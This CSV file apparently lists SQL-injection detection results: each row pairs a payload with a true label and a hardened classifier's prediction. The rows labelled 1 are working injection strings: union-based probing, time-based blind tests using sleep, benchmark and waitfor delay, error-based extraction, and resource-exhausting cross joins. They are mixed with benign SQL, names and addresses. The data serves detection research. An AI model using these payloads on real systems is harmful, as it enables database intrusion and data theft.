payload,label,hardened_pred_label,hardened_pred_score
-6200%'   )    )    or 8077  =  4661,1,1,0.99999166
SELECT president FROM any UNION ALL SELECT this FROM sunlight ORDER BY driver,0,0,7.984732e-06
"1""   )    )    as dfwi where 9703  =  9703 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,0.99999166
SELECT * FROM flag WHERE parallel  BETWEEN 10 AND 20,0,0,8.01759e-06
"  UPDATE hunter SET directly =  'from', City =  'rocky' WHERE any =  general",0,0,7.862884e-06
"c/ de pedro vidal s/n, 11d",0,0,7.937092e-06
"1'   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  'subq' like 'subq",1,1,0.99999154
if  (  8574  =  7534  )   select 8574 else drop function nxbe--,1,1,0.99999166
FROM  ( SELECT DISTINCT soldier FROM mail ) ,0,0,7.902908e-06
9805,0,0,8.0423315e-06
-6190'   )    )     )   union all select 9413--,1,1,0.99999166
1'||  (  select 'aevx' from dual where 9999  =  9999,1,1,0.99999166
1'||  (  select 'pxkz' where 2207  =  2207 and   (  3020  =  3020  )  *6703  )  ||',1,1,0.99999154
SELECT * FROM  ( SELECT beginning FROM dug ) ,0,0,7.994463e-06
" select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",1,1,0.99999166
"1'   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'aovy'  =  'aovy",1,1,0.99999154
SELECT affect ( s FROM cover RIGHT JOIN,0,0,7.977798e-06
1'||  (  select 'bgdh' from dual where 1967  =  1967,1,1,0.99999166
DELETE FROM customs,0,0,8.010383e-06
avda. fernando ferrerio s/n,0,0,7.918486e-06
le8ru41,0,0,7.959339e-06
"1%"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and ""%""  =  """,1,1,0.99999154
villadecanes,0,0,7.956478e-06
SELECT COUNT ( fence ) FROM dangerous,0,0,8.141788e-06
2.89989E+15,0,0,7.915021e-06
1   )    )    as kiqk where 7366  =  7366 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,1,0.99999154
-7242' or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'kfff'  =  'kfff,1,1,0.99999154
SELECT * FROM molecular WHERE    NOT put = 'nest',0,0,7.915369e-06
50757533y,0,0,7.92496e-06
"-4135""  )   as leiz where 3582  =  3582 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1,1,0.99999154
SELECT * FROM positive FETCH FIRST 50 PERCENT ROWS ONLY,0,0,7.870776e-06
"1'  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,0.99999154
16370,0,0,8.025239e-06
canosa,0,0,8.020259e-06
select   (  case when   (  9490  =  6134  )   then 9490 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,1,0.99999166
pembrooke_coates@stainless.gd,0,0,7.958815e-06
SELECT * FROM zero FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM mirror,0,0,7.858685e-06
SELECT AVG ( broad ) FROM trouble,0,0,8.1171665e-06
roquelina,0,0,7.987261e-06
empuar,0,0,7.997361e-06
"select count  (  *  )   from generate_series  (  1,5000000  )   and ""ihbe"" like ""ihbe",1,1,0.99999166
nataln,0,0,8.016901e-06
1'||  (  select 'avxz' from dual where 7815  =  7815,1,1,0.99999166
"1'  )   where 9226  =  9226 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,0.99999154
SELECT * FROM solar WHERE known BETWEEN 'declared' AND 'nothing',0,0,8.045246e-06
SELECT eleven ( s ) FROM these INNER JOIN,0,0,7.922701e-06
SELECT * FROM mixture  WHERE opportunity NOT LIKE '[mother]%',0,0,8.053606e-06
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""%""  =  """,1,1,0.99999154
1  )   as uhmm where 2304  =  2304 union all select null#,1,1,0.99999166
standiford@elpaisaje.bg,0,0,7.91155e-06
SELECT * FROM supply WHERE fellow = 'youth' FETCH FIRST 3 ROWS ONLY,0,0,7.8900985e-06
rudisill8,0,0,7.93128e-06
SELECT AVG ( cotton ) FROM mother,0,0,8.0784985e-06
tonkovic,0,0,7.983903e-06
SELECT * FROM tribe WHERE reach NOT LIKE '[owner]%',0,0,8.043129e-06
1'||  (  select 'hlxd' from dual where 2615  =  2615 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ||',1,1,0.99999154
1  )   as hvsk where 7902  =  7902,1,1,0.99999166
1' where 8469  =  8469,1,1,0.99999166
FROM  ( SELECT DISTINCT car FROM process ) ,0,0,7.904566e-06
"  (  select concat  (  0x7171706a71,  (  select   (  elt  (  7381  =  7381,1   )    )     )  ,0x717a767a71   )    )   ",1,1,0.99999154
villanueva de duero,0,0,7.903541e-06
"1   )    )    union all select null,null,null,null#",1,1,0.99999166
SELECT tank ( s )  FROM classroom FULL OUTER JOIN,0,0,7.8497715e-06
FROM  ( SELECT DISTINCT shine FROM farmer ) ,0,0,7.9061265e-06
"-5014%""   )    )     )   or 3348  =  2430--",1,1,0.99999166
SELECT * FROM breathing FETCH FIRST 50 PERCENT ROWS ONLY,0,0,7.890692e-06
qui0g6n16si2o,0,0,7.9156025e-06
SELECT * FROM unhappy FETCH FIRST 50 PERCENT ROWS ONLY,0,0,7.8692e-06
-6616  )   order by 1--,1,1,0.99999166
sinesio,0,0,7.979229e-06
"1%' union all select null,null,null--",1,1,0.99999166
"1%' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and '%'  =  '",1,1,0.99999154
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   4982  =  4982,1,1,0.99999154
"1""   )    )    as krro where 1050  =  1050 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1,1,0.99999166
SELECT AVG ( during )  FROM buy  SELECT SUM ( brown ) ,0,0,7.878376e-06
-8860  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,1,1,0.99999154
thordsen@guejos.sy,0,0,7.9022075e-06
SELECT * FROM sound WHERE shot BETWEEN '1996-07-01' AND '1996-07-31',0,0,7.885562e-06
-9841 where 4612  =  4612 union all select 4612--,1,1,0.99999166
descapotar,0,0,7.943498e-06
"  UPDATE sold SET merely =  'apple', City =  'sky' WHERE finest =  quietly",0,0,7.974071e-06
"1""  )   union all select null,null,null,null,null,null,null,null,null,null--",1,1,0.99999166
SELECT * FROM  ( SELECT cost FROM battle ) ,0,0,8.053061e-06
t1iesti70,0,0,7.915263e-06
SELECT yellow ( s )  FROM knowledge SELECT ocean FROM audience,0,0,8.16605e-06
SELECT COUNT ( stop ) FROM grow,0,0,8.153988e-06
/*SELECT * FROM Customers;,0,0,7.844114e-06
cister grandi,0,0,7.95138e-06
ag-uzadura,0,0,7.920744e-06
agenor,0,0,8.0434975e-06
SELECT * FROM  ( SELECT touch FROM busy ) ,0,0,7.986461e-06
SELECT * FROM slip WHERE husband = 'free'  OR alive = 'did',0,0,8.106366e-06
"1%"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""%""  =  """,1,1,0.99999166
16601924h,0,0,7.947568e-06
"1  )   where 9012  =  9012 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,0.99999154
"SELECT CustomerName, ContactName, City FROM Customers WHERE Country  =  'Brazil'; DROP VIEW view_name ; DROP VIEW [Brazil Customers];",0,0,7.832363e-06
salv sagra,0,0,7.952927e-06
DELETE FROM today,0,0,7.989958e-06
SELECT * FROM shoe WHERE Price NOT BETWEEN 10 AND 20,0,0,8.003861e-06
SELECT TOP 3 * FROM tone WHERE lesson = 'stepped' SELECT * FROM needle,0,0,7.968301e-06
-8639  )   or 8138  =  6252,1,1,0.99999166
DELETE FROM growth,0,0,7.868464e-06
SELECT * FROM belong WHERE tight = 'bow' FETCH FIRST 3 ROWS ONLY,0,0,7.905388e-06
-7442  )   or 3391  =  7492,1,1,0.99999166
SELECT * FROM meal WHERE brick = 'course'  OR island = 'feature',0,0,7.988434e-06
desmedro,0,0,7.995545e-06
fantaseadora,0,0,7.9323245e-06
1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,1,1,0.99999154
6.4255E+15,0,0,7.972079e-06
SELECT * FROM Customers  WHERE ContactName LIKE 'a%o';,0,0,7.98592e-06
SELECT * FROM sit FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM apart,0,0,7.862253e-06
1'||  (  select 'nwve' where 7721  =  7721,1,1,0.99999166
6015,0,0,8.012407e-06
"1  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",1,1,0.99999154
"1'+  (  select vohg where 6383  =  6383 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",1,1,0.99999154
SELECT * FROM flat 3,0,0,8.063158e-06
"1%""   )    )     )   union all select null,null#",1,1,0.99999166
"1""   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""abcw""  =  ""abcw",1,1,0.99999166
"   SELECT dog, angry, whetherFROM swam WHERE chart  IS NOT NULL",0,0,7.9684305e-06
1   )    )     )   union all select null--,1,1,0.99999166
"  SELECT trip,shore FROM answer WHERE gulf = 'more' UNION SELECT record, melted FROM tea",0,0,8.018216e-06
"iif  (  8354  =  3515,1,1/0  )  ",1,1,0.99999166
ji-chuu,0,0,7.937682e-06
pas63a0a,0,0,7.932726e-06
"-5998%""  )   union all select 2366,2366,2366,2366#",1,1,0.99999166
SELECT COUNT ( gray )  FROM stems,0,0,8.081712e-06
1%'   )    )     )   waitfor delay '0:0:5'--,1,1,0.99999166
3596,0,0,8.027712e-06
1'||  (  select 'cgup' from dual where 5383  =  5383 waitfor delay '0:0:5'--,1,1,0.99999166
"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1,1,0.99999154
"1%"" union all select null,null,null,null,null,null,null,null,null#",1,1,0.99999166
"-4925"" union all select 5686,5686,5686,5686,5686,5686,5686#",1,1,0.99999166
inmol4dor,0,0,7.957002e-06
rosngela,0,0,8.001129e-06
1'+  (  select 'ueak' where 7329  =  7329 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   +',1,1,0.99999154
galende,0,0,8.036804e-06
aran1el1ria,0,0,7.931379e-06
"1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  'ylit' like 'ylit",1,1,0.99999154
90230020p,0,0,7.93178e-06
"palomares, 2 11b",0,0,7.904446e-06
"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",1,1,0.99999166
SELECT TOP 50 PERCENT * FROM dirt,0,0,7.923555e-06
SELECT TOP 50 PERCENT * FROM noise,0,0,7.987764e-06
"1'   )    )    as babx where 2494  =  2494 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,0.99999154
SELECT * FROM question ORDER BY essential DESC,0,0,8.072515e-06
"-9286""   )    )    as mfxl where 9348  =  9348 union all select 9348#",1,1,0.99999166
select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,1,1,0.99999166
" select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",1,1,0.99999166
"c/ de las violetas, 104,",0,0,7.915339e-06
"calle romeral, 143, 7?h",0,0,7.913799e-06
"-9959""  )   where 7073  =  7073 union all select 7073,7073,7073,7073,7073,7073,7073,7073#",1,1,0.99999166
"1""   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""ldlp""  =  ""ldlp",1,1,0.99999166
1 where 6494  =  6494 and 8463  =  2760,1,1,0.99999166
"1,  (  select   (  case when   (  5777  =  5777  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1,1,0.99999154
"1""  )   where 6679  =  6679 rlike sleep  (  5  )  #",1,1,0.99999166
lacoste,0,0,7.958983e-06
95001516q,0,0,7.9221945e-06
SELECT * FROM pitch ORDER BY row,0,0,8.116702e-06
"   SELECT COUNT ( noun ) , hold FROM pink BY travel",0,0,8.0246655e-06
"1""  )   as kuuf where 6908  =  6908",1,1,0.99999166
SELECT TOP 50 PERCENT * FROM loose,0,0,8.0288055e-06
"  SELECT perfectID AS ID, loss AS these FROM half",0,0,8.113839e-06
SELECT * FROM sugar WHERE south BETWEEN '1996-07-01' AND '1996-07-31',0,0,7.900783e-06
SELECT tired ( s )  FROM barn UNION ALL,0,0,7.913489e-06
"SELECT * FROM wp_posts WHERE  ( post_type  =  'page' AND post_status  =  'publish' )  AND post_parent  =  27990 ORDER BY wp_posts.post_title ASC LIMIT 0,1",0,0,7.865396e-06
1'||  (  select 'xglm' from dual where 3556  =  3556 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,1,0.99999154
SELECT * FROM myself,0,0,8.173732e-06
1'   )    )     ) ,1,1,0.99999154
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 9347 )  ORDER BY meta_id ASC",0,0,7.828629e-06
"-8777""  )   as lalf where 8606  =  8606 or elt  (  4397  =  5823,5823  )  --",1,1,0.99999166
"-7714 where 9768  =  9768 union all select 9768,9768--",1,1,0.99999166
SELECT bent ( s )  FROM individual UNION ALL,0,0,7.979077e-06
1' where 5547  =  5547,1,1,0.99999166
"1""  )   as dlfq where 8410  =  8410",1,1,0.99999166
onofre,0,0,7.981268e-06
"   SELECT frighten, captain+ ', ' + further+ ' ' + slow+ ', ' + drive AS wrapped  FROM clock",0,0,8.002366e-06
"1'  )   as khaa where 8157  =  8157 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,1,0.99999154
"-2167'   )    )     )   union all select 3804,3804,3804,3804,3804,3804#",1,1,0.99999166
SELECT * FROM what WHERE by = 'quarter',0,0,8.06462e-06
frankos,0,0,7.988982e-06
"  SELECT after,instance FROM cheese WHERE wise = 'wall' UNION SELECT consonant, cave FROM plane",0,0,8.079924e-06
1.28145E+15,0,0,7.916622e-06
SELECT * FROM sitting  WHERE come = cotton,0,0,8.0525e-06
SELECT * FROM experiment WHERE foot LIKE '%store%',0,0,8.032367e-06
9.54368E+15,0,0,7.910169e-06
DELETE FROM dangerous WHERE strike = 'picture',0,0,8.035585e-06
"  SELECT they,right,matter FROM therefore LEFT JOIN Orders ON positive.deadID =  shape.standard ORDER BY naturally.or",0,0,8.029717e-06
florian@alcantarapartners.so,0,0,7.925218e-06
46160431y,0,0,7.922784e-06
37522,0,0,8.013805e-06
beaumont@lasmilyuna.gi,0,0,7.909928e-06
SELECT * FROM good,0,0,8.201303e-06
"waitfor delay '0:0:5' and   (  ""ludp"" like ""ludp",1,1,0.99999166
SELECT * FROM ordinary 3,0,0,7.956539e-06
SELECT * FROM sight ORDER BY advice DESC,0,0,8.096863e-06
SELECT * FROM group WHERE figure = 'vapor' LIMIT 3,0,0,7.952822e-06
"  SELECT nature AS milk, yet AS [ranch]  FROM complete",0,0,8.003296e-06
SELECT TOP 50 PERCENT * FROM necessary,0,0,8.074532e-06
segundo,0,0,7.981405e-06
"1"" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""oyuj""  =  ""oyuj",1,1,0.99999166
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 30710 )  ORDER BY meta_id ASC",0,0,7.8800895e-06
ostyn.martan@icodea.lu,0,0,7.91481e-06
SELECT plate FROM ability UNION ALL SELECT canal FROM sum ORDER BY slip,0,0,8.026334e-06
"   SELECT Employees.birthday, COUNT ( Orders.forceID )  AS clubFROM    ( OrdersINNER JOIN smell ON Orders.blackID  =  Employees.boundID ) ",0,0,7.881367e-06
select   (  case when   (  8857  =  1512  )   then 8857 else 8857*  (  select 8857 from mysql.db  )   end  )  #,1,1,0.99999154
"  SELECT travelID AS ID, summer AS thread FROM kept",0,0,8.1722665e-06
1'  )   as jztg where 1222  =  1222 or sleep  (  5  )  #,1,1,0.99999166
1'  )   as znak where 5203  =  5203,1,1,0.99999166
SELECT Count ( * )  AS shells,0,0,8.023419e-06
 UPDATE away SET glad = 'riding'WHERE purple = 'suppose',0,0,8.038697e-06
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 8671 )  ORDER BY meta_id ASC",0,0,7.838924e-06
berber,0,0,8.042132e-06
38747653j,0,0,7.961245e-06
"-4798""   )    )     )   union all select 7892,7892,7892,7892,7892,7892,7892,7892,7892,7892#",1,1,0.99999166
1'||  (  select 'nvvm' from dual where 5567  =  5567 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   ||',1,1,0.99999154
langellotti,0,0,7.951896e-06
" SELECT * FROM already ORDER BY hospital ASC, gone DESC",0,0,8.104133e-06
desortija0a,0,0,7.928248e-06
1'+  (  select 'jkgf' where 7487  =  7487,1,1,0.99999166
" SELECT * FROM rays ORDER BY parallel, milk",0,0,7.942279e-06
1'  )   as uwmy where 6980  =  6980,1,1,0.99999166
"1%""   )    )    and 6283  =  2068 and    (    (   ""%""  =  """,1,1,0.99999166
santibez de ecla,0,0,7.896407e-06
SELECT AVG ( instance ) FROM spite,0,0,8.138963e-06
toba,0,0,8.046298e-06
75771832b,0,0,7.914342e-06
orbita,0,0,8.044119e-06
comalada,0,0,7.984572e-06
8.11985E+15,0,0,7.908593e-06
57rsant2541,0,0,7.920624e-06
SELECT * FROM population WHERE question = 'certain',0,0,8.155731e-06
SELECT * FROM sit ORDER BY game,0,0,8.12096e-06
SELECT slipped ( s )  FROM dawn LEFT JOIN,0,0,7.996171e-06
"   SELECT COUNT ( roll ) , field FROM die BY are",0,0,7.9242345e-06
"1%""   )    )    union all select null--",1,1,0.99999166
"purpurania, 79 3?b",0,0,7.90446e-06
"1  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,1,0.99999154
"-4745"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""nifq"" like ""nifq",1,1,0.99999154
"   SELECT COUNT ( couple ) , recent FROM serious BY golden",0,0,8.014218e-06
"   SELECT becoming, atomic, researchFROM carbon WHERE modern  IS NOT NULL",0,0,8.058147e-06
"INSERT INTO steady  ( harder, football, needs )  VALUES  ( 'troops', 'her', 'feed' )  ",0,0,7.820377e-06
